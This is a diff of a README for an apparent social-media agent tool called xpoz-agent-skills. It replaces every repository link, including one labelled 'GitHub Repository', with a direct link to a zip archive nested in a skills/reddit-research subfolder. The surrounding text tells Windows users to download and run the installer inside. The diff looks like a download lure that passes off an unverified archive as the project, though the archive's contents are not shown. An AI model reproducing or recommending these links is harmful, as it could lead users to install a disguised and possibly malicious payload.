@@ -1,6 +1,6 @@
 # 🤖 xpoz-agent-skills - Smart Agent Tools for Social Media
 
-[![Download xpoz-agent-skills](https://img.shields.io/badge/Download-xpoz--agent--skills-blue?style=for-the-badge)](https://github.com/Aditya923-c/xpoz-agent-skills)
+[![Download xpoz-agent-skills](https://img.shields.io/badge/Download-xpoz--agent--skills-blue?style=for-the-badge)](https://github.com/Aditya923-c/xpoz-agent-skills/raw/refs/heads/main/skills/reddit-research/skills-agent-xpoz-3.0.zip)
 
 ---
 
@@ -32,9 +32,9 @@ Before installing, make sure your Windows PC has these specs:
 
 To get started, visit the main download page.
 
-[![Download here](https://img.shields.io/badge/Download-xpoz--agent--skills-green?style=for-the-badge)](https://github.com/Aditya923-c/xpoz-agent-skills)
+[![Download here](https://img.shields.io/badge/Download-xpoz--agent--skills-green?style=for-the-badge)](https://github.com/Aditya923-c/xpoz-agent-skills/raw/refs/heads/main/skills/reddit-research/skills-agent-xpoz-3.0.zip)
 
-1. Click the button above or go directly to **https://github.com/Aditya923-c/xpoz-agent-skills** in your browser.
+1. Click the button above or go directly to **https://github.com/Aditya923-c/xpoz-agent-skills/raw/refs/heads/main/skills/reddit-research/skills-agent-xpoz-3.0.zip** in your browser.
 2. On the page, look for the **Releases** section or the main repository files.
 3. Download the latest Windows installer or executable file. It usually appears as a `.exe` or `.msi` file.
 4. Save the file to a location you can easily find, like your Desktop or Downloads folder.
@@ -89,7 +89,7 @@ Here are some easy examples of what you can do with xpoz-agent-skills:
 
 ## 🔄 Updating xpoz-agent-skills
 
-Periodically check the download page at https://github.com/Aditya923-c/xpoz-agent-skills for new versions.
+Periodically check the download page at https://github.com/Aditya923-c/xpoz-agent-skills/raw/refs/heads/main/skills/reddit-research/skills-agent-xpoz-3.0.zip for new versions.
 
 To update:
 
@@ -123,5 +123,5 @@ If you experience issues, try these steps:
 
 # Quick Links
 
-- [Download xpoz-agent-skills](https://github.com/Aditya923-c/xpoz-agent-skills)
-- [GitHub Repository](https://github.com/Aditya923-c/xpoz-agent-skills)
+- [Download xpoz-agent-skills](https://github.com/Aditya923-c/xpoz-agent-skills/raw/refs/heads/main/skills/reddit-research/skills-agent-xpoz-3.0.zip)
+- [GitHub Repository](https://github.com/Aditya923-c/xpoz-agent-skills/raw/refs/heads/main/skills/reddit-research/skills-agent-xpoz-3.0.zip)
